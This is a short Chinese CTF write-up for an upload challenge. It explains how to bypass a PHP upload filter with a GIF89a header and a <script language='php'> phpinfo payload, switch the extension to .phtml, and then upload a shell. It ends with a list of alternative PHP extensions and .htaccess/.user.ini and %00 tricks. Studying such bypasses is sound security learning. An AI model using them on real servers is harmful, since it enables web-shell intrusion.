# \[ACTF2020 新生赛]Upload

## \[ACTF2020 新生赛]Upload

## 考点

* 文件上传phtml解析

## wp

传一个php测试一下

![](<../.gitbook/assets/image (29) (1) (1) (1) (1).png>)

![](<../.gitbook/assets/image (27) (1) (1) (1) (1).png>)

删除check再上传

![](<../.gitbook/assets/image (18) (1) (1).png>)

说明还存在过滤，可能是对文件内容或是文件头的过滤。继续上传PHP文件

```
GIF89a
<script language='php'>phpinfo();</script>
```

![](<../.gitbook/assets/image (28) (1) (1) (1).png>)

换一下后缀试一下，换成phtml

![](<../.gitbook/assets/image (8) (1) (1) (1) (1).png>)

访问成功解析，再传shell即可。

## 小结

1. 最后总结一下CTF文件上传题中常用的php拓展名:

```
利用中间件解析漏洞绕过检查，实战常用
上传.user.ini或.htaccess将合法拓展名文件当作php文件解析
%00截断绕过
php3文件
php4文件
php5文件
php7文件
phtml文件
phps文件
pht文件
```
